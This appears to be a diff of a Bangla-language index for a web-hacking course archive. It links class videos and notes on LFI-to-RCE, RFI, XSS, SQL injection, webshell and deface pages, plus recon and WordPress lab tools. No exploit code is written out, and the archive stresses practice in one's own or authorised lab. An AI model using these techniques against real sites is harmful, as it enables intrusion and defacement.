-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1657993995903189)
-
-## Local File Inclusion Vulnerability(Lfi):
-
-Date: unverified · Category: documents · ID: entry-131
-
-Local File Inclusion Vulnerability(Lfi):
-নিয়ে কিছু বলার আগে ছোট করে বলে দেই - আগে আমরা ওয়েব সাইটের ভার্নাবেলিটি থেকে ওয়েবসাইটের তথ্য বের করেছি বা ওয়েবসাইট এক্সেস কিংবা হ্যাক করেছি। এই পার্টে আমরা দেখবো ওয়েবসাইটের ভার্নাভেলিটির মাধ্যমে ওয়েব সার্ভারের গুরুত্বপূর্ণ তথ্য বের করা। এবং তাতে এমন ও হতে পারে আমরা ওয়েব এপ্লিকেশন সিস্টেমের গোটা সার্ভার নিয়ন্ত্রণে নিয়ে নিতে পারি।
-PDF
-Web Server.pdf
-
-- [Resource](/documents/web-server.pdf)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1656475676055021)
-
-## আপনার ক্লাস টপিক রিলেটেড যে কোন সমস্যা সম্পর্কে এই পোস্টের কমেন্টে স্ক্রিনশট সহ বর্ণনা করুন। পাশা…
-
-Date: unverified · Category: information · ID: entry-133
-
-#happy_support_day
-আপনার ক্লাস টপিক রিলেটেড যে কোন সমস্যা সম্পর্কে এই পোস্টের কমেন্টে স্ক্রিনশট সহ বর্ণনা করুন। পাশাপাশি আপনার যদি কোন প্রশ্ন থাকে তাও করতে পারেন। অথবা আপনি চাইলে নিম্নোক্ত টাইমে সরাসরি লাইভ সাপোর্ট সেশনে জয়েন করে নিতে পারেন।
-Meet-এ যোগদানের তথ্য:
-সময়:
-প্রথম সেশন: সন্ধ্যা ৭:১৫ টা থেকে রাত ৯ টা পর্যন্ত
-দ্বিতীয় সেশন: রাত ১০ থেকে মধ্য রাত ২ টা পর্যন্ত
-লিঙ্ক: [মিটিং লিংক প্রকাশ করা হয়নি]
-[মিটিং ডায়াল নম্বর ও PIN প্রকাশ করা হয়নি]
-কিভাবে সাহায্য পাবেন: আপনি চাইলে মঙ্গলবার সারাদিন সাপোর্ট পোস্টের কমেন্টের মাধ্যমে যোগাযোগ করে আপনার প্রবলেমের বিষয় জানিয়ে সমস্যার সমাধান নিতে পারেন অথবা উল্লেখিত নির্দিষ্ট সময়ের মধ্যে মিটিংয়ে জয়েন করে সমস্যার সমাধান নিতে পারবেন।
-ধন্যবাদ।
-
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1658753369160585)
-
-## Java & Go commands:
-
-Date: unverified · Category: documents · ID: entry-135
-
-Java & Go commands:
-PDF
-java&go commands.pdf
-
-- [Resource](/documents/java-go-commands.pdf)
-
-## Burploader resource:
-
-Date: unverified · Category: tools · ID: entry-136
-
-Burploader resource:
-
-- [burploader-source.zip](https://drive.google.com/file/d/15P0WvfiBNKYdf8rVFul1wwiknBk3d5Ee/view)
-- [Resource](https://github.com/sahmsec/burploader)
-
-## LFI to Rce Final
-
-Date: unverified · Category: classes · ID: entry-137
-
-youtube.com
-LFI to Rce Final
-
-- [Resource](https://youtu.be/5MQFCI1a9uQ)
-
-## LFI — Not acceptable bypass
-
-Date: unverified · Category: classes · ID: entry-138
-
-https://youtu.be/fobeXDPJZdk
-youtube.com
-LFI (not acceptable bypass)
-
-- [Resource](https://youtu.be/fobeXDPJZdk)
-
-## Advance LFI to RCE
-
-Date: 2026-09-25 · Category: classes · ID: entry-139
-
-Advance LFI to RCE
-0:00 / 0:00
-
-- [Resource](https://www.facebook.com/XploitAsh.sh/videos/2585418491898562/)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1662445735458015)
-
-## Topic: "Web hosting Concept & Wordpress"
-
-Date: 2026-09-27 · Category: information · ID: entry-140
-
-Topic: "Web hosting Concept & Wordpress"
-Class link : [মিটিং লিংক প্রকাশ করা হয়নি]
-Class topic will start 9:45 PM
-@everyone
-
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1664387545263834)
-
-## LFI to RFI
-
-Date: unverified · Category: classes · ID: entry-141
-
-LFI to RFI
-0:00 / 0:00
-
-
-## Recon Part 1
-
-Date: 2026-10-02 · Category: classes · ID: entry-143
-
-Join Class @everyone
-https://www.facebook.com/S4MC71/videos/976877741338543/?idorvanity=1598186498550606
-Recon Part 1
-
-- [Resource](https://www.facebook.com/S4MC71/videos/976877741338543/)
-- [Resource](https://www.facebook.com/groups/awsb66delta/)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1669334581435797)
-
-## আপনার ক্লাস টপিক রিলেটেড যে কোন সমস্যা সম্পর্কে এই পোস্টের কমেন্টে স্ক্রিনশট সহ বর্ণনা করুন। পাশা…
-
-Date: unverified · Category: information · ID: entry-144
-
-আপনার ক্লাস টপিক রিলেটেড যে কোন সমস্যা সম্পর্কে এই পোস্টের কমেন্টে স্ক্রিনশট সহ বর্ণনা করুন। পাশাপাশি আপনার যদি কোন প্রশ্ন থাকে তাও করতে পারেন। অথবা আপনি চাইলে নিম্নোক্ত টাইমে সরাসরি লাইভ সাপোর্ট সেশনে জয়েন করে নিতে পারেন।
-Meet-এ যোগদানের তথ্য:
-সময়:
-প্রথম সেশন:
-সন্ধ্যা ৭:১৫ টা থেকে রাত ৯ টা পর্যন্ত
-দ্বিতীয় সেশন:
-রাত ১০ থেকে মধ্য রাত ২ টা পর্যন্ত
-লিঙ্ক:
-[মিটিং লিংক প্রকাশ করা হয়নি]
-[মিটিং ডায়াল নম্বর ও PIN প্রকাশ করা হয়নি]
-কিভাবে সাহায্য পাবেন:
-আপনি চাইলে মঙ্গলবার সারাদিন সাপোর্ট পোস্টের কমেন্টের মাধ্যমে যোগাযোগ করে আপনার প্রবলেমের বিষয় জানিয়ে সমস্যার সমাধান নিতে পারেন অথবা উল্লেখিত নির্দিষ্ট সময়ের মধ্যে মিটিংয়ে জয়েন করে সমস্যার সমাধান নিতে পারবেন।
-ধন্যবাদ।
-meet.google.com
-
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1665357758500146)
-
-## LFI to RFI
-
-Date: unverified · Category: information · ID: entry-146
-
-LFI to RFI
-
-
-## Class 22 — WordPress Backup, Wordfence Malware Scan ও XAMPP Lab
-
-Date: 2026-10-04 · Category: recordings · ID: entry-148
-
-ক্লাস রেকর্ড
-০৪/১০/২০২৬
-12E9FMcDqORPKk_G6SWH5EbGU_PS8eyU2
-
-- [Resource](https://drive.google.com/file/d/12E9FMcDqORPKk_G6SWH5EbGU_PS8eyU2/view?usp=sharing)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1671359777899944)
-
-## XSS — Homework Task 5 (HW5.pdf)
-
-Date: 2026-08-09 · Category: documents · ID: msg-hw5-xss
-
-Messenger-এ দেওয়া XSS homework। ক্লাস ৬-এর Cross Site Scripting বিষয়ের সঙ্গে যুক্ত। Homework Task 5 ফাইলের নাম; এটি ক্লাসের সিরিয়াল নয়।
-পাবলিক কপিতে স্ক্রিনশটের session cookie মানগুলো মুছে দেওয়া হয়েছে। মূল প্রশ্ন ও উদাহরণ অক্ষত আছে। অনুশীলন কেবল নিজস্ব বা অনুমতিপ্রাপ্ত ল্যাবে করুন।
-
-- [hw5-xss-public.pdf](/documents/hw5-xss-public.pdf)
-
-## Deface Page — HTML অনুশীলন ফাইল
-
-Date: 2026-08-21 · Category: documents · ID: msg-deface-example
-
-Messenger-এর deface.html ফাইলটি মূল অবস্থায় ZIP-এর মধ্যে সংরক্ষিত। ক্লাস ৯-এর WebShell, Backdoor ও Deface Page বিষয়ের সঙ্গে যুক্ত।
-ZIP-এ original HTML ও README আছে। HTML-এ বাহ্যিক রিসোর্স এবং স্থানীয় ছবি-পাথ আছে; নিজের ল্যাবে ব্যবহারের আগে source দেখুন।
-
-- [deface-class-example.zip](/documents/deface-class-example.zip)
-
-## WordPress Backup — All-in-One WP Migration 7.48
-
-Date: 2026-10-04 · Category: tools · ID: msg-wp-migration
-
-ক্লাস ২২-এর WordPress backup/migration বিষয়ের সঙ্গে সম্পর্কিত Messenger-এর migration ফোল্ডারের ফাইল। মূল ZIP এবং ভেতরের লাইসেন্স অক্ষত রেখে সংরক্ষণ করা হয়েছে।
-এটি কোর্সে দেওয়া পুরোনো 7.48 সংস্করণ; অনুশীলনের স্থানীয় ল্যাবের জন্য সংরক্ষিত। নতুন বা চলমান সাইটে ব্যবহারের আগে বর্তমান সংস্করণ ও compatibility যাচাই করুন।
-ব্যবহার: WordPress dashboard → Plugins → Add New → Upload Plugin-এ ZIP নির্বাচন করুন। Backup/export ও import-এর জন্য All-in-One WP Migration মেনু ব্যবহার করুন।
-একই ফোল্ডারের Unlimited Extension পুনর্বিতরণের অনুমতি দেয় না, তাই তার ZIP প্রকাশ করা হয়নি। কোর্সের Duplicator Pro ZIP-এ activation-state পরিবর্তন পাওয়া গেছে; সেটি চালানো বা প্রকাশ করা হয়নি। অফিসিয়াল Duplicator Lite বিকল্প আলাদা রিসোর্সে আছে।
-
-- [all-in-one-wp-migration.zip](/tools/all-in-one-wp-migration-7.48.zip)
-- [Resource](https://servmask.com/products)
-
-## Wordfence 9.0.2 — WordPress Security Scan
-
-Date: unverified · Category: tools · ID: tool-wordfence
-
-ক্লাস ২২: ৭১:০০ মিনিটে Wordfence 9.0.2 ইনস্টল; ৭৫:০০–৮৩:০০ মিনিটে Standard scan।
-সেটআপ: WordPress → Plugins → Add New → Upload Plugin-এ ZIP দিন অথবা অফিসিয়াল Wordfence খুঁজুন। Activate করে নিজের সাইটের জন্য নিবন্ধন সম্পন্ন করুন। Wordfence → Scan → Start New Scan।
-ফলাফল ও backup যাচাই ছাড়া কোনো ফাইল মুছবেন না। ZIP ক্লাসে দেখানো সংস্করণের; চলমান সাইটে সর্বশেষ আপডেট ব্যবহার করুন।
-
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/tool-wordfence)
 - [Wordfence 9.0.2 ZIP ডাউনলোড ↓](https://downloads.wordpress.org/plugin/wordfence.9.0.2.zip)
-- [Resource](https://wordpress.org/plugins/wordfence/)
 
-## WordPress Local Lab — XAMPP ও phpMyAdmin
+### tool-wordpress-lab — WordPress Local Lab — XAMPP ও phpMyAdmin
 
-Date: unverified · Category: tools · ID: tool-wordpress-lab
+বিষয়: WordPress · তারিখ: যাচাই বাকি · ধরন: tools
 
-ক্লাস ২০ ও ২২-এর local lab software। XAMPP-এ Apache, MariaDB, PHP এবং phpMyAdmin থাকে।
-সেটআপ: XAMPP ইনস্টল → Apache/MySQL চালু → htdocs-এর নিজের lab folder-এ WordPress extract → localhost/phpmyadmin-এ database তৈরি → localhost-এ WordPress সেটআপ। Database port ও web server port আলাদা।
-ক্লাস ২২: ৩৭:০০–৩৯:০০ XAMPP/htdocs; ৪১:০০–৫৯:০০ database নিয়ে কাজ। ভিডিওতে WordPress 7.1.2 দেখা যায়; নিচে অফিসিয়াল বর্তমান ZIP। XAMPP installer ও Control Panel-এর version আলাদা।
-
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/tool-wordpress-lab)
 - [XAMPP 8.2.12 Windows 64-bit installer ↓](https://sourceforge.net/projects/xampp/files/XAMPP%20Windows/8.2.12/xampp-windows-x64-8.2.12-0-VS16-installer.exe)
 - [WordPress অফিসিয়াল ZIP ↓](https://wordpress.org/latest.zip)
 - [phpMyAdmin অফিসিয়াল ডাউনলোড ↗](https://www.phpmyadmin.net/downloads/)
-- [Resource](https://www.apachefriends.org/download.html)
 
-## Elementor — WordPress Page Builder
+### tool-elementor — Elementor — WordPress Page Builder
 
-Date: unverified · Category: tools · ID: tool-elementor
+বিষয়: WordPress · তারিখ: যাচাই বাকি · ধরন: tools
 
-ক্লাস ২০-এর Elementor topic-এর অফিসিয়াল free plugin। Plugins → Add New → Upload Plugin → ZIP দিন → Activate। Pages → Edit with Elementor দিয়ে নিজের lab page সম্পাদনা করুন। এটি Pro package নয়।
-
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/tool-elementor)
 - [Elementor 4.3.4 ZIP ডাউনলোড ↓](https://downloads.wordpress.org/plugin/elementor.4.3.4.zip)
-- [Resource](https://wordpress.org/plugins/elementor/)
 
-## Duplicator Lite — অফিসিয়াল Backup বিকল্প
+### tool-duplicator-official — Duplicator Lite — অফিসিয়াল Backup বিকল্প
 
-Date: unverified · Category: tools · ID: tool-duplicator-official
+বিষয়: WordPress · তারিখ: যাচাই বাকি · ধরন: tools
 
-ক্লাস ২২-এ Duplicator Pro দেখা যায়। পাওয়া Pro ZIP-এ activation-state পরিবর্তন থাকায় সেটি এখানে বিতরণ করা হয়নি। নিচে অফিসিয়াল free Lite বিকল্প; Lite ও Pro-এর সুবিধা এক নয়।
-সেটআপ: Plugins → Add New → Duplicator খুঁজে Install/Activate। নিজের lab site-এর backup তৈরি করুন। পুনরুদ্ধারের আগে বর্তমান site/database backup রাখুন।
-
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/tool-duplicator-official)
 - [Duplicator Lite অফিসিয়াল ডাউনলোড ↗](https://wordpress.org/plugins/duplicator/)
-- [Resource](https://duplicator.com/)
 
-## Burp Suite Community — অফিসিয়াল Setup
+### tool-burp-official — Burp Suite Community — অফিসিয়াল Setup
 
-Date: unverified · Category: tools · ID: tool-burp-official
+বিষয়: Burp Suite · তারিখ: যাচাই বাকি · ধরন: tools
 
-ক্লাস ৮-এর Proxy/Intruder, ক্লাস ১১-এর PortSwigger lab ও ক্লাস ১৮-এর Kali/Burp setup-এর জন্য অফিসিয়াল Community বিকল্প। Pro-এর সব সুবিধা এতে নেই।
-নিজের lab-এ Proxy-এর embedded browser দিয়ে শুরু করুন। আলাদা Firefox ব্যবহারে proxy/certificate setup প্রয়োজন। বর্তমান native installer-এ Java runtime থাকে; বর্তমান JAR-এর জন্য Java 21 বা পরের সংস্করণ প্রয়োজন। পুরোনো course version-এর compatibility আলাদা।
-
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/tool-burp-official)
 - [Burp Suite Community ডাউনলোড ↗](https://portswigger.net/burp/communitydownload)
 - [Java JDK (Temurin) ডাউনলোড ↗](https://adoptium.net/temurin/releases/)
 - [Firefox অফিসিয়াল ডাউনলোড ↗](https://www.mozilla.org/firefox/new/)
-- [Resource](https://portswigger.net/burp/documentation/desktop/getting-started/download-and-install)
 
-## Kali Linux ও VMware — Virtual Lab Downloads
+### tool-linux-official — Kali Linux ও VMware — Virtual Lab Downloads
 
-Date: unverified · Category: tools · ID: tool-linux-official
+বিষয়: Linux & Scripting · তারিখ: যাচাই বাকি · ধরন: tools
 
-ক্লাস ১৪-এর virtual lab ও ক্লাস ১৮-এর Kali setup-এর অফিসিয়াল sources। নিজের architecture অনুযায়ী Kali installer/VM image নিন। VMware download-এ Broadcom account ও terms লাগতে পারে; এটি সরাসরি installer mirror নয়। ক্লাসের installation guide Tools ট্যাবেও আছে।
-
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/tool-linux-official)
 - [Kali Linux অফিসিয়াল ডাউনলোড ↗](https://www.kali.org/get-kali/)
 - [VMware অফিসিয়াল download নির্দেশনা ↗](https://knowledge.broadcom.com/external/article/368667/download-and-license-information-for-vmw.html)
-- [Resource](https://www.kali.org/get-kali/)
 
-## Go, Python ও Git — Recon Prerequisites
+### tool-go-recon — Go, Python ও Git — Recon Prerequisites
 
-Date: unverified · Category: tools · ID: tool-go-recon
+বিষয়: Recon & Enumeration · তারিখ: যাচাই বাকি · ধরন: tools
 
-ক্লাস ১৮-এর Java/Go নোট ও ক্লাস ২১-এর Recon resource-এর প্রস্তুতির software sources। Go ক্লাস ১৮-এরও বিষয়; Python/Git/curl/wget-এর প্রস্তুতি Recon resource-এ আছে।
-নিজের OS-এর অফিসিয়াল installer নিন। Go/Python/Git version ও Go PATH যাচাই করুন। Python packages-এর জন্য পৃথক environment রাখুন। সব Recon phase শেখানো সম্পূর্ণ হয়েছে এমন দাবি করা হচ্ছে না।
-
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/tool-go-recon)
 - [Go অফিসিয়াল ডাউনলোড ↗](https://go.dev/dl/)
 - [Python অফিসিয়াল ডাউনলোড ↗](https://www.python.org/downloads/)
 - [Git অফিসিয়াল ডাউনলোড ↗](https://git-scm.com/downloads/)
-- [Resource](https://arenauser.notion.site/Recon-for-Web-Application-bc489086047f4320802b919f0cdeb70e)
 
-## Shodan — Recon Web Tool
+### tool-shodan — Shodan — Recon Web Tool
 
-Date: unverified · Category: tools · ID: tool-shodan
+বিষয়: Recon & Enumeration · তারিখ: যাচাই বাকি · ধরন: tools
 
-ক্লাস ২১-এর Shodan topic-এর অফিসিয়াল web tool। আলাদা installer প্রয়োজন নেই। সেবার account/plan অনুযায়ী সুবিধা পাওয়া যায়।
-
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/tool-shodan)
 - [Shodan খুলুন ↗](https://www.shodan.io/)
-- [Resource](https://www.shodan.io/)
 
-## OSINT — IP Lookup, WHOIS ও Web Archive
+### tool-osint — OSINT — IP Lookup, WHOIS ও Web Archive
 
-Date: unverified · Category: tools · ID: tool-osint
+বিষয়: OSINT · তারিখ: যাচাই বাকি · ধরন: tools
 
-ক্লাস ৩-এর নোটে থাকা browser-based OSINT resources। আলাদা installer প্রয়োজন নেই। নিজের বা অনুমোদিত বিষয় নিয়ে অনুসন্ধান করুন।
-
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/tool-osint)
 - [IP lookup খুলুন ↗](https://whatismyipaddress.com/ip-lookup)
 - [WHOIS খুলুন ↗](https://whois.domaintools.com/)
 - [Wayback Machine খুলুন ↗](https://web.archive.org/)
 
-## ক্লাস ২২ — Website/Database Practice Files
+### tool-class22-lab-files — ক্লাস ২২ — Website/Database Practice Files
 
-Date: unverified · Category: tools · ID: tool-class22-lab-files
+বিষয়: WordPress · তারিখ: যাচাই বাকি · ধরন: tools
 
-ভিডিওর ৩৯:০০ মিনিটে website files.zip (প্রায় 782 MB), পরে database import/export দেখা গেছে। একই দিনের Messenger practice files-এর নিরাপদ, ব্যবহারযোগ্য কপি এখনও সংরক্ষণ করা যায়নি। যাচাই করা কপি পাওয়া গেলে এখানে download যুক্ত হবে। বর্তমানে প্রস্তুত download নেই।
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/tool-class22-lab-files)
 
+### tool-windows-batch — Windows Command Prompt — Batch Scripting সহায়ক রেফারেন্স
 
+বিষয়: Linux & Scripting · তারিখ: যাচাই বাকি · ধরন: tools
+
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/tool-windows-batch)
+- [Microsoft Command Prompt reference ↗](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd)
+
+### msg-class22-duplicator-pro — Duplicator Pro 4.5.10 — কোর্স ফাইল ও যাচাই
+
+বিষয়: WordPress · তারিখ: 2026-10-04 · ধরন: tools
+
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/msg-class22-duplicator-pro)
+- [Duplicator Pro কোর্স ZIP — মূল সোর্স ↗](https://drive.google.com/file/d/1q_Hr1q2Ex3rzPrCzLbNQunbu7xSD21Se/view)
+- [Duplicator Pro — অফিসিয়াল সংস্করণ ও লাইসেন্স ↗](https://duplicator.com/)
+
+### msg-class22-unlimited-extension — All-in-One WP Migration Unlimited Extension — কোর্স ফাইল
+
+বিষয়: WordPress · তারিখ: 2026-10-04 · ধরন: tools
+
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/msg-class22-unlimited-extension)
+- [Unlimited Extension কোর্স ZIP — মূল সোর্স ↗](https://drive.google.com/file/d/1RbBIbC3tw2KxvJG9MdYA9aO5ZTkDGkP9/view)
+- [Unlimited Extension — অফিসিয়াল সংস্করণ ও লাইসেন্স ↗](https://servmask.com/products/unlimited-extension)
+
+### class-2026-10-09 — Recon Part 2 — Web Application ও Directory Discovery
+
+বিষয়: Recon · তারিখ: 2026-10-09 · ধরন: recordings
+
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#class/class-2026-10-09)
+
+### guide-recon-class23 — Recon for Web Application — গাইড, নোট ও টুল সূচি
+
+বিষয়: Recon · তারিখ: 2026-10-09 · ধরন: documents
+
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/guide-recon-class23)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/notes/recon-class23-summary.md)
+- [প্রশিক্ষকের মূল Recon গাইড খুলুন ↗](https://arenauser.notion.site/Recon-for-Web-Application-bc489086047f4320802b919f0cdeb70e)
+- [সংরক্ষিত Recon টুল ও রিসোর্স সূচি (.md) ↓](https://arena-b66-delta-archive.vercel.app/notes/recon-class23-resource-index.md)
+
+### tool-directory-discovery — ffuf ও SecLists — Directory Discovery
+
+বিষয়: Recon · তারিখ: 2026-10-09 · ধরন: tools
+
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/tool-directory-discovery)
+- [ffuf অফিসিয়াল releases / ডাউনলোড ↗](https://github.com/ffuf/ffuf/releases)
+- [ffuf সেটআপ ও ব্যবহার ↗](https://github.com/ffuf/ffuf)
+- [SecLists wordlists ও ডাউনলোড ↗](https://github.com/danielmiessler/SecLists)
+- [Feroxbuster অফিসিয়াল releases ↗](https://github.com/epi052/feroxbuster/releases)
+- [dirsearch অফিসিয়াল source / সেটআপ ↗](https://github.com/maurosoria/dirsearch)
+
+### notes-class12-acunetix — Acunetix — সংক্ষিপ্ত সহায়ক পাঠনোট
+
+বিষয়: Acunetix · তারিখ: 2026-08-30 · ধরন: documents
+
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/notes-class12-acunetix)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/notes/class12-acunetix-study.md)
+
+### notes-class15-linux-cli — Linux Command Line — সহায়ক নোট ও অনুশীলন
+
+বিষয়: Linux & Scripting · তারিখ: 2026-09-11 · ধরন: documents
+
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/notes-class15-linux-cli)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/notes/class15-linux-cli-study.md)
+- [Linux CLI অনুশীলন ফাইল (.txt) ↓](https://arena-b66-delta-archive.vercel.app/documents/class15-linux-cli-practice.txt)
+- [GNU-এর মূল reference PDF ↗](https://www.gnu.org/software/coreutils/manual/coreutils.pdf)
+
+### notes-class19-lfi-rce — Advanced LFI / RCE — সহায়ক নোট ও অনুশীলন
+
+বিষয়: LFI / RCE · তারিখ: 2026-09-25 · ধরন: documents
+
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/notes-class19-lfi-rce)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/notes/class19-lfi-rce-study.md)
+- [File Inclusion review worksheet (.txt) ↓](https://arena-b66-delta-archive.vercel.app/documents/class19-lfi-review-worksheet.txt)
+
+### class-2026-10-11 — SQLMap ও Dalfox — SQL Injection ও XSS Tools
+
+বিষয়: SQL Injection · তারিখ: 2026-10-11 · ধরন: recordings
+
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#class/class-2026-10-11)
+
+### notes-class24-sqlmap-dalfox — SQLMap ও Dalfox — সংরক্ষিত সহায়ক পাঠনোট
+
+বিষয়: SQL Injection · তারিখ: 2026-10-11 · ধরন: documents
+
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/notes-class24-sqlmap-dalfox)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/notes/class24-sqlmap-dalfox.md)
+
+### tool-sqlmap-class24 — SQLMap — Source ZIP, Python ও Setup
+
+বিষয়: SQL Injection · তারিখ: 2026-10-11 · ধরন: tools
+
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/tool-sqlmap-class24)
+- [SQLMap অফিসিয়াল source ZIP ডাউনলোড ↓](https://github.com/sqlmapproject/sqlmap/zipball/master)
+- [SQLMap সেটআপ ও repository ↗](https://github.com/sqlmapproject/sqlmap)
+- [SQLMap ব্যবহার নির্দেশিকা ↗](https://github.com/sqlmapproject/sqlmap/wiki)
+- [Python অফিসিয়াল installer ↗](https://www.python.org/downloads/)
+
+### tool-dalfox-class24 — Dalfox — XSS Tool, Releases ও Setup
+
+বিষয়: XSS · তারিখ: 2026-10-11 · ধরন: tools
+
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/tool-dalfox-class24)
+- [Dalfox অফিসিয়াল releases / ডাউনলোড ↗](https://github.com/hahwul/dalfox/releases)
+- [Dalfox অফিসিয়াল installation guide ↗](https://dalfox.hahwul.com/getting-started/installation/)
+- [Dalfox repository ও version তথ্য ↗](https://github.com/hahwul/dalfox)
+
+### notes-class01-google-dorks — ক্লাস 01 — পাঠনোট ও Google Advanced Search / Dork
+
+বিষয়: Orientation · তারিখ: 2026-07-19 · ধরন: documents
+
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/notes-class01-google-dorks)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/notes/class01-search-study-guide.md)
+- [অফিসিয়াল রেফারেন্স ↗](https://support.google.com/websearch/answer/2466433?hl=en)
+- [অফিসিয়াল রেফারেন্স ↗](https://developers.google.com/search/docs/monitor-debug/search-operators)
+
+### notes-class02-google-dorks — ক্লাস 02 — পাঠনোট ও Google Advanced Search / Dork
+
+বিষয়: SQL Injection · তারিখ: 2026-07-24 · ধরন: documents
+
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/notes-class02-google-dorks)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/notes/class02-search-study-guide.md)
+- [অফিসিয়াল রেফারেন্স ↗](https://portswigger.net/web-security/sql-injection)
+- [অফিসিয়াল রেফারেন্স ↗](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
+- [অফিসিয়াল রেফারেন্স ↗](https://support.google.com/websearch/answer/2466433?hl=en)
+- [অফিসিয়াল রেফারেন্স ↗](https://developers.google.com/search/docs/monitor-debug/search-operators)
+
+### notes-class03-google-dorks — ক্লাস 03 — পাঠনোট ও Google Advanced Search / Dork
+
+বিষয়: OSINT · তারিখ: 2026-07-26 · ধরন: documents
+
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/notes-class03-google-dorks)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/notes/class03-search-study-guide.md)
+- [অফিসিয়াল রেফারেন্স ↗](https://developers.google.com/search/docs/monitor-debug/search-operators)
+- [অফিসিয়াল রেফারেন্স ↗](https://support.google.com/websearch/answer/2466433?hl=en)
+
+### notes-class04-google-dorks — ক্লাস 04 — পাঠনোট ও Google Advanced Search / Dork
+
+বিষয়: Session & Redirect · তারিখ: 2026-07-31 · ধরন: documents
+
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/notes-class04-google-dorks)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/notes/class04-search-study-guide.md)
+- [অফিসিয়াল রেফারেন্স ↗](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
+- [অফিসিয়াল রেফারেন্স ↗](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
+- [অফিসিয়াল রেফারেন্স ↗](https://support.google.com/websearch/answer/2466433?hl=en)
+- [অফিসিয়াল রেফারেন্স ↗](https://developers.google.com/search/docs/monitor-debug/search-operators)
+
+### notes-class05-google-dorks — ক্লাস 05 — পাঠনোট ও Google Advanced Search / Dork
+
+বিষয়: SQL Injection · তারিখ: 2026-08-02 · ধরন: documents
+
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/notes-class05-google-dorks)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/notes/class05-search-study-guide.md)
+- [অফিসিয়াল রেফারেন্স ↗](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
+- [অফিসিয়াল রেফারেন্স ↗](https://support.google.com/websearch/answer/2466433?hl=en)
+- [অফিসিয়াল রেফারেন্স ↗](https://developers.google.com/search/docs/monitor-debug/search-operators)
+
+### notes-class06-google-dorks — ক্লাস 06 — পাঠনোট ও Google Advanced Search / Dork
+
+বিষয়: XSS · তারিখ: 2026-08-09 · ধরন: documents
+
+[বিস্তারিত, নোট ও সংযুক্তি](https://arena-b66-delta-archive.vercel.app/#resource/notes-class06-google-dorks)
+- [সংরক্ষিত ফাইল/নোট](https://arena-b66-delta-archive.vercel.app/notes/class06-search-study-guide.md)
+- [অফিসিয়াল রেফারেন্স ↗](https://portswigger.net/web-security/cross-site-scripting)
+- [অফিসিয়াল রেফারেন্স ↗](https://support.google.com/websearch/answer/2466433?hl=en)
